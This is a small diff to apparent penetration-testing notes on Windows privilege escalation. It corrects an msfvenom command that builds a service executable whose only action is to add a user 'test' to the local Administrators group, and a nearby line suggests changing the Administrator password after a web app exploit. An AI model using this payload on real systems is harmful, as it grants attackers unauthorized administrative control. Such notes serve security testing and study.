@@ -5,6 +5,6 @@ Remember to use exe-service payload as I seemed to have issues getting a standar
   
 Then:
 
-  msfvenom -p windows/x64/exe CMD="cmd.exe /c 'net localgroup Administrators test /add'" -f exe-service -o admuser.exe
+  msfvenom -p windows/x64/exec CMD="cmd.exe /c 'net localgroup Administrators test /add'" -f exe-service -o admuser.exe
 
 If we have limited access (e.g. through a web app exploit) then we'll have to add the current user to the Administrators group or change Administrator password
